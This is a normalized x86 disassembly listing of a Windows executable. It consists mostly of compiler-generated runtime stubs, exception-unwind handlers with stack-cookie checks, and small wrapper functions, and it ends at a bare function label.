call sub_4278bb
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_42e1a8
xor eax eax
inc eax
retn
sub_42e1bc
call sub_42f4f6
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_42e188
call eax
sub_42e1cf
push sub_42e188
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_42e1e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_42e1ed
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_42e1fa
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_42e391
test ebx ebx
je r-xdata
retn
push 0x0
call sub_425cba
pop ecx
sub_42e407
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_42e767
pop ecx
mov [ rw-data ] 0x1
sub_42e75e
push 0xd
call sub_425cba
pop ecx
retn
sub_42e8df
push 0xd
call sub_425cba
pop ecx
retn
sub_42ec39
push 0x1
call sub_425cba
pop ecx
retn
sub_42ecae
push esi
call sub_424117
pop ecx
retn
sub_42f126
push edi
call sub_435345
pop ecx
retn
sub_42f4e1
push 0xd
call sub_425cba
pop ecx
retn
sub_42f4ed
push 0xc
call sub_425cba
pop ecx
retn
sub_42f61e
push 0xd
call sub_425cba
pop ecx
retn
sub_42f627
push 0xc
call sub_425cba
pop ecx
retn
sub_42f6a6
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
jmp sub_425b8a
push eax
call sub_427537
or [ rw-data ] 0xffffffff
pop ecx
sub_42fa08
push 0xc
call sub_425cba
pop ecx
retn
sub_42fa60
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_42cc00
sub_42fa76
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_42cc00
sub_42fad5
push 0xc
call sub_425cba
pop ecx
retn
sub_430170
push 0xc
call sub_425cba
pop ecx
retn
sub_43017f
push 0xc
call sub_425cba
pop ecx
retn
sub_4301b2
and [ esi + 0x70 ] 0xffffffef
retn
sub_4309fc
and [ rw-data ] 0x0
retn
sub_430a45
push sub_430a04
call sub_427863
pop ecx
xor eax eax
retn
sub_430ec9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4312e7
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43120b
add esp 0x18
pop ebp
retn
sub_43196f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
neg eax
sbb eax eax
and eax 0x1
pop ebp
retn
sub_431fb9
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp [ eax ] 0xc000001d
je r-xdata
xor eax eax
retn
sub_432000
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_43208e
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_432565
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4326d2
add esp 0x18
pop ebp
retn
sub_432a44
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_432a55
pop ecx
pop ecx
pop ebp
retn
sub_432ad3
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_432aeb
add esp 0x10
pop ebp
retn
sub_432b2b
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_432b3c
pop ecx
pop ecx
pop ebp
retn
sub_432c4d
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_432c17
pop ecx
pop ecx
pop ebp
retn
sub_432e19
mov [ ebp - 0x90 ] 0x1
or cl cl
retn
sub_432e23
or cl cl
je r-xdata
retn
fchs
sub_432e90
fld st0
frndint
fsubr st1
fxch st1
fchs
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_432ea5
mov edx [ esp + 0x4 ]
and edx 0x300
or edx 0x7f
mov [ esp + 0x6 ] dx
fldcw [ esp + 0x6 ]
retn
sub_432ebc
test eax 0x80000
je r-xdata
fadd [ r--data ]
mov eax 0x1
retn
mov eax 0x7
retn
sub_432f18
mov eax [ esp + 0x8 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ esp + 0x8 ]
retn
retn
sub_433bb7
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_43339f
add esp 0x18
pop ebp
retn
sub_433ea9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_433de0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_433ef4
call eax
retn
sub_434ef2
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_434dff
add esp 0x10
pop ebp
retn
sub_435028
push 0xa
call sub_425cba
pop ecx
retn
sub_435105
push 0xa
call sub_425cba
pop ecx
retn
sub_4351cd
push 0xb
call sub_425cba
pop ecx
retn
sub_4356bf
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43559d
add esp 0x14
pop ebp
retn
sub_4356da
push 0x2
call sub_42350a
sub_4357f6
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_4356e3
add esp 0x18
pop ebp
retn
sub_435814
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43582c
add esp 0x10
pop ebp
retn
sub_435941
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_435959
add esp 0x10
pop ebp
retn
sub_436e0f
xor eax eax
retn
sub_4387f0
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_438807
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_43afa0
lea ecx [ ebp - 0x10 ]
jmp sub_4216e6
sub_43afa8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43afc3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43afe0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call sub_401010
add esp 0x8
retn
sub_43aff1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b010
lea ecx [ ebp - 0x44 ]
jmp sub_40cb60
sub_43b018
mov eax [ ebp - 0x50 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x50 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_401830
sub_43b031
lea ecx [ ebp - 0x2c ]
jmp sub_401830
sub_43b039
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b060
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b090
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b0c0
lea ecx [ ebp - 0x1c ]
jmp sub_413ea0
sub_43b0c8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x78 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b0f0
lea ecx [ ebp - 0x28 ]
jmp sub_401830
sub_43b0f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b120
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b140
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x9c ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b170
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b190
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b1b0
lea ecx [ ebp - 0x14 ]
jmp sub_4216e6
sub_43b1b8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b1e0
mov ecx [ ebp - 0x10 ]
jmp sub_414140
sub_43b1e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b210
mov ecx [ ebp - 0x10 ]
jmp sub_40cb60
sub_43b218
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b240
mov ecx [ ebp - 0x14 ]
jmp sub_4133c0
sub_43b248
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_4134a0
sub_43b253
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b270
mov ecx [ ebp - 0x10 ]
jmp sub_410860
sub_43b278
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b2a0
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_410670
sub_43b2bc
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_4106e0
sub_43b2c7
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_411250
sub_43b2d2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b2f0
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_410670
sub_43b30c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b330
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
add ecx 0x60
jmp sub_410670
sub_43b34c
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_410410
sub_43b357
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_411250
sub_43b362
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b380
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_410670
sub_43b39c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b3c0
mov ecx [ ebp - 0x10 ]
jmp sub_40d2f0
sub_43b3c8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b3f0
mov ecx [ ebp - 0x10 ]
jmp sub_40d390
sub_43b3f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b420
lea ecx [ ebp - 0x11 ]
jmp sub_40cb60
sub_43b428
lea ecx [ ebp - 0x5c ]
jmp sub_40bdc0
sub_43b430
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b460
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_401830
sub_43b46b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b490
mov ecx [ ebp - 0x10 ]
jmp sub_40bdc0
sub_43b498
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_40bdc0
sub_43b4a3
mov ecx [ ebp - 0x10 ]
add ecx 0x30
jmp sub_40bdc0
sub_43b4ae
mov ecx [ ebp - 0x10 ]
add ecx 0x48
jmp sub_40bdc0
sub_43b4b9
mov ecx [ ebp - 0x10 ]
add ecx 0x60
jmp sub_40bdc0
sub_43b4c4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b4e0
mov ecx [ ebp - 0x10 ]
jmp sub_4216e6
sub_43b4e8
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_4102e0
sub_43b4f3
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_4102e0
sub_43b4fe
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_4102e0
sub_43b509
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_4102e0
sub_43b514
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp sub_4102e0
sub_43b51f
mov ecx [ ebp - 0x10 ]
add ecx 0x2c
jmp sub_4102e0
sub_43b52a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b550
mov ecx [ ebp - 0x10 ]
jmp sub_40cf40
sub_43b558
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b580
lea ecx [ ebp - 0x28 ]
jmp sub_401830
sub_43b588
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b5b0
mov ecx [ ebp - 0x10 ]
jmp sub_410800
sub_43b5b8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b5e0
mov ecx [ ebp - 0x10 ]
jmp sub_40cd50
sub_43b5e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b610
lea ecx [ ebp - 0x4c ]
jmp sub_412140
sub_43b618
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b640
push sub_401830
push 0x80
push 0x18
lea eax [ ebp - 0xc10 ]
push eax
call sub_423f3b
retn
sub_43b659
lea ecx [ ebp - 0xc28 ]
jmp sub_401830
sub_43b664
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc94 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b690
lea ecx [ ebp + 0x8 ]
jmp sub_40ea60
sub_43b698
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b6c0
lea ecx [ ebp - 0x11 ]
jmp sub_40cb60
sub_43b6c8
lea ecx [ ebp - 0x12 ]
jmp sub_40cb60
sub_43b6d0
lea ecx [ ebp - 0xc8 ]
jmp sub_40f9c0
sub_43b6db
lea ecx [ ebp - 0x60 ]
jmp sub_401830
sub_43b6e3
lea ecx [ ebp - 0x78 ]
jmp sub_401830
sub_43b6eb
lea ecx [ ebp - 0x168 ]
jmp sub_40bdc0
sub_43b6f6
lea ecx [ ebp - 0x30 ]
jmp sub_401830
sub_43b6fe
lea ecx [ ebp - 0x198 ]
jmp sub_40bdc0
sub_43b709
lea ecx [ ebp - 0x1b0 ]
jmp sub_40bdc0
sub_43b714
lea ecx [ ebp - 0x180 ]
jmp sub_40bdc0
sub_43b71f
mov eax [ ebp - 0xd0 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0xd0 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_401830
sub_43b73e
lea ecx [ ebp - 0x228 ]
jmp sub_401830
sub_43b749
lea ecx [ ebp - 0x378 ]
jmp sub_401830
sub_43b754
lea ecx [ ebp - 0x48 ]
jmp sub_401830
sub_43b75c
lea ecx [ ebp - 0xa8 ]
jmp sub_401830
sub_43b767
lea ecx [ ebp - 0x288 ]
jmp sub_401830
sub_43b772
lea ecx [ ebp - 0x348 ]
jmp sub_401830
sub_43b77d
lea ecx [ ebp - 0x258 ]
jmp sub_401830
sub_43b788
lea ecx [ ebp - 0x210 ]
jmp sub_401830
sub_43b793
lea ecx [ ebp - 0x1e0 ]
jmp sub_401830
sub_43b79e
lea ecx [ ebp - 0x2a0 ]
jmp sub_401830
sub_43b7a9
lea ecx [ ebp - 0x270 ]
jmp sub_401830
sub_43b7b4
lea ecx [ ebp - 0x330 ]
jmp sub_401830
sub_43b7bf
lea ecx [ ebp - 0x300 ]
jmp sub_401830
sub_43b7ca
lea ecx [ ebp - 0x90 ]
jmp sub_401830
sub_43b7d5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x388 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b800
lea ecx [ ebp - 0x411 ]
jmp sub_40cb60
sub_43b80b
lea ecx [ ebp - 0x444 ]
jmp sub_40bdc0
sub_43b816
lea ecx [ ebp - 0x4fc ]
jmp sub_40e520
sub_43b821
lea ecx [ ebp - 0x42c ]
jmp sub_401830
sub_43b82c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x51c ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b860
lea ecx [ ebp - 0x1a12 ]
jmp sub_40cb60
sub_43b86b
lea ecx [ ebp - 0x1a2c ]
jmp sub_401830
sub_43b876
push sub_40ea60
push 0x80
push 0x34
lea eax [ ebp - 0x1a10 ]
push eax
call sub_423f3b
retn
sub_43b88f
lea ecx [ ebp - 0x1a13 ]
jmp sub_40cb60
sub_43b89a
lea ecx [ ebp - 0x1a44 ]
jmp sub_40bdc0
sub_43b8a5
lea ecx [ ebp - 0x1a88 ]
jmp sub_40bdc0
sub_43b8b0
lea ecx [ ebp - 0x1aa0 ]
jmp sub_401830
sub_43b8bb
lea ecx [ ebp - 0x1a11 ]
jmp sub_40cb60
sub_43b8c6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1ab0 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b8f0
lea ecx [ ebp - 0x11 ]
jmp sub_40cb60
sub_43b8f8
lea ecx [ ebp - 0x2c ]
jmp sub_40bdc0
sub_43b900
lea ecx [ ebp - 0xd4 ]
jmp sub_40e810
sub_43b90b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xd4 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b940
lea ecx [ ebp - 0x14 ]
jmp sub_4216e6
sub_43b948
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b970
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b990
lea ecx [ ebp - 0x28 ]
jmp sub_401830
sub_43b998
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43b9c0
mov eax [ ebp - 0x14 ]
push eax
call j_sub_422732#2
pop ecx
retn
sub_43b9cb
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x58 ]
jmp sub_40ce50
sub_43b9e4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43ba00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43ba30
lea ecx [ ebp - 0x24 ]
jmp sub_40d130
sub_43ba38
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43ba60
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43ba80
lea ecx [ ebp - 0x18 ]
jmp sub_413ea0
sub_43ba88
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bab0
lea ecx [ ebp - 0x28 ]
jmp sub_414140
sub_43bab8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bae0
lea ecx [ ebp - 0x20 ]
jmp sub_40dde0
sub_43bae8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bb10
lea ecx [ ebp - 0x20 ]
jmp sub_40d130
sub_43bb18
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bb40
lea ecx [ ebp - 0x2c ]
jmp sub_401830
sub_43bb48
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bb70
lea ecx [ ebp - 0x1c ]
jmp sub_413ea0
sub_43bb78
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bba0
lea ecx [ ebp - 0x2c ]
jmp sub_401830
sub_43bba8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bbd0
lea ecx [ ebp - 0x1c ]
jmp sub_40d130
sub_43bbd8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bc00
lea ecx [ ebp - 0xccb8 ]
jmp sub_40bdc0
sub_43bc0b
lea ecx [ ebp - 0xcca0 ]
jmp sub_401830
sub_43bc16
lea ecx [ ebp - 0xcc88 ]
jmp sub_401830
sub_43bc21
lea ecx [ ebp - 0xcdcc ]
jmp sub_401830
sub_43bc2c
lea ecx [ ebp - 0xcde4 ]
jmp sub_401830
sub_43bc37
lea ecx [ ebp - 0xccd0 ]
jmp sub_401830
sub_43bc42
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xce00 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bc70
lea ecx [ ebp - 0x28 ]
jmp sub_401830
sub_43bc78
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
lea ecx [ ebp - 0x5c ]
jmp sub_401830
sub_43bc91
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bcc0
mov ecx [ ebp - 0x14 ]
jmp sub_41a500
sub_43bcc8
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_4134a0
sub_43bcd3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bcf0
lea ecx [ ebp + 0x8 ]
jmp sub_401830
sub_43bcf8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c4 ]
xor ecx eax
call sub_421ed7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bd20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_421ed7
mov eax r--data
jmp sub_425b20
sub_43bd40
